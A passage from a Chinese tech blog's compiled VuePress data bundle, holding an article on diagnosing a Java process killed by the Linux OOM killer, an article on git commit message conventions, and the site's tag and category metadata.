应用服务不能使用\n\n\n# 原因分析\n\nLinux 内核有个机制叫OOM killer(Out Of Memory killer)，该机制会监控那些占用内存过大，尤其是瞬间占用内存很快的进程，然后防止内存耗尽而自动把该进程杀掉。\n\n内核检测到系统内存不足、挑选并杀掉某个进程的过程可以参考内核源代码linux/mm/oom_kill.c，当系统内存不足的时候，out_of_memory()被触发，然后调用select_bad_process()选择一个”bad”进程杀掉。\n\n如何判断和选择一个”bad进程呢？linux选择”bad”进程是通过调用oom_badness()，挑选的算法和想法都很简单很朴实：最bad的那个进程就是那个最占用内存的进程。\n\nLinux下这个选择策略也一直在不断的演化。作为用户，我们可以通过设置一些值来影响OOM killer做出决策。Linux下每个进程都有个OOM权重，在/proc//oom_adj里面，取值是-17到+15，取值越高，越容易被干掉。\n\n最终OOM killer是通过/proc//oom_score这个值来决定哪个进程被干掉的。这个值是系统综合进程的内存消耗量、CPU时间(utime + stime)、存活时间(uptime - start time)和oom_adj计算出的，消耗内存越多分越高，存活时间越长分越低。总之，总的策略是：损失最少的工作，释放最大的内存同时不伤及无辜的用了很大内存的进程，并且杀掉的进程数尽量少。\n\n\n# 解决方法\n\n方法1：通过调整 JVM 参数限制最大可使用内存\n\n-Xmx2g\n\n\n1\n\n\n方法2：启用 swap 分区 参考https://help.aliyun.com/knowledge_detail/42534.html\n\n方法3：增加物理内存或增加机器\n\n方法4：将应用分配到压力较小的服务器上",normalizedContent:"查看java系统错误日志、gc日志都没有发现任何问题，服务器应用总是隔三岔五莫名其妙被停掉。。\n\n\n\n * 问题排查\n * 原因分析\n * 解决方法\n\n\n\nlinux内存使用量超过阈值，使得java应用程序无可用内存，最终导致程序崩溃。即使在程序没有挂掉时把程序停掉，系统内存也不会被释放。\n\n\n# 问题排查\n\n查看 linux 的系统日志 /var/log/message 出现如下日志，说明 linux 系统自身把 java 进程杀掉了\n\n# grep 'out of memory' messages*\ndec 14 11:21:59 ecs-web kernel: out of memory: kill process 17873 (java) score 67 or sacrifice child\n\n\n1\n2\n\n\n当 linux 系统内存不足时，系统会把当前系统占用系统内存过高的进程当做流氓进程，然后系统发出信号将这个流氓进程杀掉，最后导致 java 应用服务不能使用\n\n\n# 原因分析\n\nlinux 内核有个机制叫oom killer(out of memory killer)，该机制会监控那些占用内存过大，尤其是瞬间占用内存很快的进程，然后防止内存耗尽而自动把该进程杀掉。\n\n内核检测到系统内存不足、挑选并杀掉某个进程的过程可以参考内核源代码linux/mm/oom_kill.c，当系统内存不足的时候，out_of_memory()被触发，然后调用select_bad_process()选择一个”bad”进程杀掉。\n\n如何判断和选择一个”bad进程呢？linux选择”bad”进程是通过调用oom_badness()，挑选的算法和想法都很简单很朴实：最bad的那个进程就是那个最占用内存的进程。\n\nlinux下这个选择策略也一直在不断的演化。作为用户，我们可以通过设置一些值来影响oom killer做出决策。linux下每个进程都有个oom权重，在/proc//oom_adj里面，取值是-17到+15，取值越高，越容易被干掉。\n\n最终oom killer是通过/proc//oom_score这个值来决定哪个进程被干掉的。这个值是系统综合进程的内存消耗量、cpu时间(utime + stime)、存活时间(uptime - start time)和oom_adj计算出的，消耗内存越多分越高，存活时间越长分越低。总之，总的策略是：损失最少的工作，释放最大的内存同时不伤及无辜的用了很大内存的进程，并且杀掉的进程数尽量少。\n\n\n# 解决方法\n\n方法1：通过调整 jvm 参数限制最大可使用内存\n\n-xmx2g\n\n\n1\n\n\n方法2：启用 swap 分区 参考https://help.aliyun.com/knowledge_detail/42534.html\n\n方法3：增加物理内存或增加机器\n\n方法4：将应用分配到压力较小的服务器上",charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"版本控制提交规范你会了吗？",frontmatter:{title:"版本控制提交规范你会了吗？",date:"2020-09-07T00:00:00.000Z",tags:["开发规范","Java"],categories:["规范 Standard"],isShowComments:!0},regularPath:"/views/specification/%E6%8F%90%E4%BA%A4%E8%A7%84%E8%8C%83.html",relativePath:"views/specification/提交规范.md",key:"v-1c7f86e0",path:"/views/specification/%E6%8F%90%E4%BA%A4%E8%A7%84%E8%8C%83.html",headers:[{level:2,title:"提交规范的作用",slug:"提交规范的作用",normalizedTitle:"提交规范的作用",charIndex:3},{level:2,title:"提交规范",slug:"提交规范",normalizedTitle:"提交规范",charIndex:3},{level:2,title:"提交类别",slug:"提交类别",normalizedTitle:"提交类别",charIndex:22},{level:2,title:"示例：",slug:"示例",normalizedTitle:"示例：",charIndex:30}],excerpt:"<Boxx/>\n",headersStr:"提交规范的作用 提交规范 提交类别 示例：",content:" * 提交规范的作用\n * 提交规范\n * 提交类别\n * 示例：\n\n\n\n\n# 提交规范的作用\n\n * 提供更多的信息，方便排查与回退\n * 过滤关键字，迅速定位\n * 方便生成文档\n\n\n# 提交规范\n\n规范版本记录提交信息，在提交信息中描述新特性、bug 修复和破坏性变更。\n\n提交 message 格式如下:\n\n&lt;类型>[可选的作用域]: &lt;描述>\n\n[可选的正文]\n\n[可选的脚注]\n\n\n1\n2\n3\n4\n5\n\n\n\n# 提交类别\n\ncommit 的类型，包涵以下几种：\n\nCODE            INFO\nfeat: msg       新功能 feature\nfix: msg        修复 bug\nmerge: msg      merge\ndocs: msg       文档修改\nstyle: msg      更改了前端样式\njs: msg         更改了前端代码\nrefactor: msg   重构：即不是新增功能，也不是修改 bug 的代码变动\ntest: msg       增加测试\nchore: msg      构建过程或辅助工具的变动\nrm: msg         删除文件或代码\n\n\n# 示例：\n\nfeat($browser): onUrlChange event (popstate/hashchange/polling)\n\nAdded new event to $browser:\n- forward popstate event if available\n- forward hashchange event if popstate not available\n- do polling when neither popstate nor hashchange available\n\nBreaks $browser.onHashChange, which was removed (use onUrlChange instead)\n\n---------\n\nfix($compile): couple of unit tests for IE9\n\nOlder IEs serialize html uppercased, but IE9 does not...\nWould be better to expect case insensitive, unfortunately jasmine does\nnot allow to user regexps for throw expectations.\n\nCloses #392\nBreaks foo.bar api, foo.baz should be used instead\n\n---------\n\neat(directive): ng:disabled, ng:checked, ng:multiple, ng:readonly, ng:selected\n\nNew directives for proper binding these attributes in older browsers (IE).\nAdded coresponding description, live examples and e2e tests.\n\nCloses #351\n\n---------\n\nfeat($compile): simplify isolate scope bindings\n\nChanged the isolate scope binding options to:\n  - @attr - attribute binding (including interpolation)\n  - =model - by-directional model binding\n  - &expr - expression execution binding\n\nThis change simplifies the terminology as well as\nnumber of choices available to the developer. It\nalso supports local name aliasing from the parent.\n\nBREAKING CHANGE: isolate scope bindings definition has changed and\nthe inject option for the directive controller injection was removed.\n\nTo migrate the code follow the example below:\n\nBefore:\n\nscope: {\n  myAttr: 'attribute',\n  myBind: 'bind',\n  myExpression: 'expression',\n  myEval: 'evaluate',\n  myAccessor: 'accessor'\n}\n\nAfter:\n\nscope: {\n  myAttr: '@',\n  myBind: '@',\n  myExpression: '&',\n  // myEval - usually not useful, but in cases where the expression is assignable, you can use '='\n  myAccessor: '=' // in directive's template change myAccessor() to myAccessor\n}\n\nThe removed `inject` wasn't generaly useful for directives so there should be no code using it.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n\n\n当然，我们一般不用书写这么详细，在工作中简明扼要即可，如：\n\nfeat($theme-default): add code group and code block components\n\n\n1\n",normalizedContent:" * 提交规范的作用\n * 提交规范\n * 提交类别\n * 示例：\n\n\n\n\n# 提交规范的作用\n\n * 提供更多的信息，方便排查与回退\n * 过滤关键字，迅速定位\n * 方便生成文档\n\n\n# 提交规范\n\n规范版本记录提交信息，在提交信息中描述新特性、bug 修复和破坏性变更。\n\n提交 message 格式如下:\n\n&lt;类型>[可选的作用域]: &lt;描述>\n\n[可选的正文]\n\n[可选的脚注]\n\n\n1\n2\n3\n4\n5\n\n\n\n# 提交类别\n\ncommit 的类型，包涵以下几种：\n\ncode            info\nfeat: msg       新功能 feature\nfix: msg        修复 bug\nmerge: msg      merge\ndocs: msg       文档修改\nstyle: msg      更改了前端样式\njs: msg         更改了前端代码\nrefactor: msg   重构：即不是新增功能，也不是修改 bug 的代码变动\ntest: msg       增加测试\nchore: msg      构建过程或辅助工具的变动\nrm: msg         删除文件或代码\n\n\n# 示例：\n\nfeat($browser): onurlchange event (popstate/hashchange/polling)\n\nadded new event to $browser:\n- forward popstate event if available\n- forward hashchange event if popstate not available\n- do polling when neither popstate nor hashchange available\n\nbreaks $browser.onhashchange, which was removed (use onurlchange instead)\n\n---------\n\nfix($compile): couple of unit tests for ie9\n\nolder ies serialize html uppercased, but ie9 does not...\nwould be better to expect case insensitive, unfortunately jasmine does\nnot allow to user regexps for throw expectations.\n\ncloses #392\nbreaks foo.bar api, foo.baz should be used instead\n\n---------\n\neat(directive): ng:disabled, ng:checked, ng:multiple, ng:readonly, ng:selected\n\nnew directives for proper binding these attributes in older browsers (ie).\nadded coresponding description, live examples and e2e tests.\n\ncloses #351\n\n---------\n\nfeat($compile): simplify isolate scope bindings\n\nchanged the isolate scope binding options to:\n  - @attr - attribute binding (including interpolation)\n  - =model - by-directional model binding\n  - &expr - expression execution binding\n\nthis change simplifies the terminology as well as\nnumber of choices available to the developer. it\nalso supports local name aliasing from the parent.\n\nbreaking change: isolate scope bindings definition has changed and\nthe inject option for the directive controller injection was removed.\n\nto migrate the code follow the example below:\n\nbefore:\n\nscope: {\n  myattr: 'attribute',\n  mybind: 'bind',\n  myexpression: 'expression',\n  myeval: 'evaluate',\n  myaccessor: 'accessor'\n}\n\nafter:\n\nscope: {\n  myattr: '@',\n  mybind: '@',\n  myexpression: '&',\n  // myeval - usually not useful, but in cases where the expression is assignable, you can use '='\n  myaccessor: '=' // in directive's template change myaccessor() to myaccessor\n}\n\nthe removed `inject` wasn't generaly useful for directives so there should be no code using it.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n\n\n当然，我们一般不用书写这么详细，在工作中简明扼要即可，如：\n\nfeat($theme-default): add code group and code block components\n\n\n1\n",charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{frontmatter:{layout:"Tags",title:"Tags"},regularPath:"/tag/",key:"v-b1564aac",path:"/tag/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"FrontmatterKey",title:"Categories"},regularPath:"/categories/",key:"v-ef9325c4",path:"/categories/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"TimeLines",title:"Timeline"},regularPath:"/timeline/",key:"v-6319eb4e",path:"/timeline/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Tag",title:"分布式 Tags"},regularPath:"/tag/%E5%88%86%E5%B8%83%E5%BC%8F/",key:"v-08174efe",path:"/tag/分布式/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Tag",title:"网关 Tags"},regularPath:"/tag/%E7%BD%91%E5%85%B3/",key:"v-3cf63429",path:"/tag/网关/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Tag",title:"poi Tags"},regularPath:"/tag/poi/",key:"v-322fe662",path:"/tag/poi/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Tag",title:"源码分析 Tags"},regularPath:"/tag/%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/",key:"v-70487ef8",path:"/tag/源码分析/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Tag",title:"Java Tags"},regularPath:"/tag/Java/",key:"v-18082c7a",path:"/tag/Java/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Tag",title:"多线程 Tags"},regularPath:"/tag/%E5%A4%9A%E7%BA%BF%E7%A8%8B/",key:"v-75682621",path:"/tag/多线程/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Tag",title:"jdk Tags"},regularPath:"/tag/jdk/",key:"v-3235acf0",path:"/tag/jdk/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Tag",title:"安装教程 Tags"},regularPath:"/tag/%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/",key:"v-36208144",path:"/tag/安装教程/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Tag",title:"SPI Tags"},regularPath:"/tag/SPI/",key:"v-324b3466",path:"/tag/SPI/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Tag",title:"定时任务 Tags"},regularPath:"/tag/%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/",key:"v-63814eec",path:"/tag/定时任务/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Tag",title:"pdf Tags"},regularPath:"/tag/pdf/",key:"v-323039b2",path:"/tag/pdf/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Tag",title:"Docker Tags"},regularPath:"/tag/Docker/",key:"v-83bebff6",path:"/tag/Docker/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Tag",title:"Dubbo Tags"},regularPath:"/tag/Dubbo/",key:"v-fb55f58a",path:"/tag/Dubbo/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Tag",title:"日志 Tags"},regularPath:"/tag/%E6%97%A5%E5%BF%97/",key:"v-231b917c",path:"/tag/日志/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Tag",title:"IO模型 Tags"},regularPath:"/tag/IO%E6%A8%A1%E5%9E%8B/",key:"v-f11be80a",path:"/tag/IO模型/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Tag",title:"MyBatis Tags"},regularPath:"/tag/MyBatis/",key:"v-f5f3b4b4",path:"/tag/MyBatis/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Tag",title:"jvm Tags"},regularPath:"/tag/jvm/",key:"v-32352550",path:"/tag/jvm/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Tag",title:"sql优化 Tags"},regularPath:"/tag/sql%E4%BC%98%E5%8C%96/",key:"v-71925cf6",path:"/tag/sql优化/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Tag",title:"jwt Tags"},regularPath:"/tag/jwt/",key:"v-32351c1c",path:"/tag/jwt/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Tag",title:"RabbitMQ Tags"},regularPath:"/tag/RabbitMQ/",key:"v-3c438db2",path:"/tag/RabbitMQ/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Tag",title:"Redis Tags"},regularPath:"/tag/Redis/",key:"v-cd4f2d44",path:"/tag/Redis/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Tag",title:"Spring Security Tags"},regularPath:"/tag/Spring%20Security/",key:"v-4c97ede3",path:"/tag/Spring Security/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Tag",title:"Swagger2 Tags"},regularPath:"/tag/Swagger2/",key:"v-36fc09bd",path:"/tag/Swagger2/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Tag",title:"ZooKeeper Tags"},regularPath:"/tag/ZooKeeper/",key:"v-d3c816e6",path:"/tag/ZooKeeper/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Tag",title:"Spring Boot Tags"},regularPath:"/tag/Spring%20Boot/",key:"v-29013a71",path:"/tag/Spring Boot/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Tag",title:"单元测试 Tags"},regularPath:"/tag/%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/",key:"v-46031d55",path:"/tag/单元测试/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Tag",title:"破解 Tags"},regularPath:"/tag/%E7%A0%B4%E8%A7%A3/",key:"v-ee617cea",path:"/tag/破解/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Tag",title:"IDEA Tags"},regularPath:"/tag/IDEA/",key:"v-184030a4",path:"/tag/IDEA/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Tag",title:"CTF Tags"},regularPath:"/tag/CTF/",key:"v-3259a2f8",path:"/tag/CTF/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Tag",title:"WriteUP Tags"},regularPath:"/tag/WriteUP/",key:"v-6517e57f",path:"/tag/WriteUP/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Tag",title:"adworld Tags"},regularPath:"/tag/adworld/",key:"v-b21fe52c",path:"/tag/adworld/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Tag",title:"NSSCTF Tags"},regularPath:"/tag/NSSCTF/",key:"v-c33959c4",path:"/tag/NSSCTF/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Tag",title:"ECharts Tags"},regularPath:"/tag/ECharts/",key:"v-5e43a71f",path:"/tag/ECharts/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Tag",title:"vuepress Tags"},regularPath:"/tag/vuepress/",key:"v-dfb71430",path:"/tag/vuepress/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Tag",title:"JavaScript Tags"},regularPath:"/tag/JavaScript/",key:"v-7a5f6990",path:"/tag/JavaScript/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Tag",title:"json Tags"},regularPath:"/tag/json/",key:"v-14722046",path:"/tag/json/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Tag",title:"网络协议 Tags"},regularPath:"/tag/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/",key:"v-3c2760d0",path:"/tag/网络协议/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Tag",title:"Vue Tags"},regularPath:"/tag/Vue/",key:"v-32475d9a",path:"/tag/Vue/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Tag",title:"CTFLearn Tags"},regularPath:"/tag/CTFLearn/",key:"v-071a3554",path:"/tag/CTFLearn/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Tag",title:"Via Tags"},regularPath:"/tag/Via/",key:"v-3247b8aa",path:"/tag/Via/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Tag",title:"Misc Tags"},regularPath:"/tag/Misc/",key:"v-17ac6f8e",path:"/tag/Misc/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Tag",title:"复习 Tags"},regularPath:"/tag/%E5%A4%8D%E4%B9%A0/",key:"v-5acc93b2",path:"/tag/复习/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Tag",title:"开发规范 Tags"},regularPath:"/tag/%E5%BC%80%E5%8F%91%E8%A7%84%E8%8C%83/",key:"v-4a5e8070",path:"/tag/开发规范/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Tag",title:"k8s Tags"},regularPath:"/tag/k8s/",key:"v-32360c9a",path:"/tag/k8s/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Tag",title:"git Tags"},regularPath:"/tag/git/",key:"v-32383f72",path:"/tag/git/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Tag",title:"linux Tags"},regularPath:"/tag/linux/",key:"v-7418fe36",path:"/tag/linux/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Category",title:"后端 Back-end Categories"},regularPath:"/categories/%E5%90%8E%E7%AB%AF%20Back-end/",key:"v-c2a8e576",path:"/categories/后端 Back-end/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Category",title:"知识晶体 Q&A Categories"},regularPath:"/categories/%E7%9F%A5%E8%AF%86%E6%99%B6%E4%BD%93%20Q&A/",key:"v-eaa23b1a",path:"/categories/知识晶体 Q&A/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Category",title:"随笔 Essay Categories"},regularPath:"/categories/%E9%9A%8F%E7%AC%94%20Essay/",key:"v-ab316f34",path:"/categories/随笔 Essay/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Category",title:"前端 Front-end Categories"},regularPath:"/categories/%E5%89%8D%E7%AB%AF%20Front-end/",key:"v-60e851e2",path:"/categories/前端 Front-end/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Category",title:"规范 Standard Categories"},regularPath:"/categories/%E8%A7%84%E8%8C%83%20Standard/",key:"v-e09e3912",path:"/categories/规范 Standard/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Category",title:"命理学 Numerology Categories"},regularPath:"/categories/%E5%91%BD%E7%90%86%E5%AD%A6%20Numerology/",key:"v-717d25c5",path:"/categories/命理学 Numerology/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Layout",title:"Page 2 - 源码分析 | Tags"},regularPath:"/tag/%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/page/2/",key:"v-04bd0e8e",path:"/tag/源码分析/page/2/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Layout",title:"Page 3 - 源码分析 | Tags"},regularPath:"/tag/%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/page/3/",key:"v-04bd0e50",path:"/tag/源码分析/page/3/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Layout",title:"Page 2 - Java | Tags"},regularPath:"/tag/Java/page/2/",key:"v-e3c98acc",path:"/tag/Java/page/2/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Layout",title:"Page 3 - Java | Tags"},regularPath:"/tag/Java/page/3/",key:"v-e3c98a8e",path:"/tag/Java/page/3/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Layout",title:"Page 4 - Java | Tags"},regularPath:"/tag/Java/page/4/",key:"v-e3c98a50",path:"/tag/Java/page/4/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Layout",title:"Page 5 - Java | Tags"},regularPath:"/tag/Java/page/5/",key:"v-e3c98a12",path:"/tag/Java/page/5/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Layout",title:"Page 2 - CTF | Tags"},regularPath:"/tag/CTF/page/2/",key:"v-2c124ab9",path:"/tag/CTF/page/2/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Layout",title:"Page 3 - CTF | Tags"},regularPath:"/tag/CTF/page/3/",key:"v-2c124ad8",path:"/tag/CTF/page/3/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Layout",title:"Page 4 - CTF | Tags"},regularPath:"/tag/CTF/page/4/",key:"v-2c124af7",path:"/tag/CTF/page/4/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Layout",title:"Page 5 - CTF | Tags"},regularPath:"/tag/CTF/page/5/",key:"v-2c124b16",path:"/tag/CTF/page/5/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Layout",title:"Page 6 - CTF | Tags"},regularPath:"/tag/CTF/page/6/",key:"v-2c124b35",path:"/tag/CTF/page/6/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Layout",title:"Page 7 - CTF | Tags"},regularPath:"/tag/CTF/page/7/",key:"v-2c124b54",path:"/tag/CTF/page/7/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Layout",title:"Page 2 - WriteUP | Tags"},regularPath:"/tag/WriteUP/page/2/",key:"v-6e085944",path:"/tag/WriteUP/page/2/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Layout",title:"Page 3 - WriteUP | Tags"},regularPath:"/tag/WriteUP/page/3/",key:"v-6e085906",path:"/tag/WriteUP/page/3/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Layout",title:"Page 2 - NSSCTF | Tags"},regularPath:"/tag/NSSCTF/page/2/",key:"v-0b72b642",path:"/tag/NSSCTF/page/2/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Layout",title:"Page 2 - CTFLearn | Tags"},regularPath:"/tag/CTFLearn/page/2/",key:"v-bb9eb8b2",path:"/tag/CTFLearn/page/2/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Layout",title:"Page 3 - CTFLearn | Tags"},regularPath:"/tag/CTFLearn/page/3/",key:"v-bb9eb874",path:"/tag/CTFLearn/page/3/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Layout",title:"Page 4 - CTFLearn | Tags"},regularPath:"/tag/CTFLearn/page/4/",key:"v-bb9eb836",path:"/tag/CTFLearn/page/4/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Layout",title:"Page 2 - 后端 Back-end | Categories"},regularPath:"/categories/%E5%90%8E%E7%AB%AF%20Back-end/page/2/",key:"v-707700d8",path:"/categories/后端 Back-end/page/2/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Layout",title:"Page 3 - 后端 Back-end | Categories"},regularPath:"/categories/%E5%90%8E%E7%AB%AF%20Back-end/page/3/",key:"v-707700f7",path:"/categories/后端 Back-end/page/3/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Layout",title:"Page 4 - 后端 Back-end | Categories"},regularPath:"/categories/%E5%90%8E%E7%AB%AF%20Back-end/page/4/",key:"v-70770116",path:"/categories/后端 Back-end/page/4/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Layout",title:"Page 5 - 后端 Back-end | Categories"},regularPath:"/categories/%E5%90%8E%E7%AB%AF%20Back-end/page/5/",key:"v-70770135",path:"/categories/后端 Back-end/page/5/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Layout",title:"Page 6 - 后端 Back-end | Categories"},regularPath:"/categories/%E5%90%8E%E7%AB%AF%20Back-end/page/6/",key:"v-70770154",path:"/categories/后端 Back-end/page/6/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Layout",title:"Page 7 - 后端 Back-end | Categories"},regularPath:"/categories/%E5%90%8E%E7%AB%AF%20Back-end/page/7/",key:"v-70770173",path:"/categories/后端 Back-end/page/7/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Layout",title:"Page 2 - 随笔 Essay | Categories"},regularPath:"/categories/%E9%9A%8F%E7%AC%94%20Essay/page/2/",key:"v-a7aca2d2",path:"/categories/随笔 Essay/page/2/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Layout",title:"Page 3 - 随笔 Essay | Categories"},regularPath:"/categories/%E9%9A%8F%E7%AC%94%20Essay/page/3/",key:"v-a7aca294",path:"/categories/随笔 Essay/page/3/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Layout",title:"Page 2 - 命理学 Numerology | Categories"},regularPath:"/categories/%E5%91%BD%E7%90%86%E5%AD%A6%20Numerology/page/2/",key:"v-b87e4f50",path:"/categories/命理学 Numerology/page/2/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Layout",title:"Page 3 - 命理学 Numerology | Categories"},regularPath:"/categories/%E5%91%BD%E7%90%86%E5%AD%A6%20Numerology/page/3/",key:"v-b87e4f12",path:"/categories/命理学 Numerology/page/3/",headersStr:null,content:"",normalizedContent:"",charsets:{}},{frontmatter:{layout:"Layout",title:"Page 4 - 命理学 Numerology | Categories"},regularPath:"/categories/%E5%91%BD%E7%90%86%E5%AD%A6%20Numerology/page/4/",key:"v-b87e4ed4",path:"/categories/命理学 Numerology/page/4/",headersStr:null,content:"",normalizedContent:"",charsets:{}}],themeConfig:{nav:[{text:"主页",link:"/index.html",icon:"reco-home"},{text:"其它",icon:"reco-document",items:[{text:"Projects🎈",items:[{text:"✔ My Project ✨",link:"/other/project"},{text:"✔ 友 情 链 接 🎃",link:"/other/friends"}]},{text:"Common sites🎈",items:[{text:"Java SE API Documentation",link:"https://docs.oracle.com/javase/8/docs/api/index.html"},{text:"Program 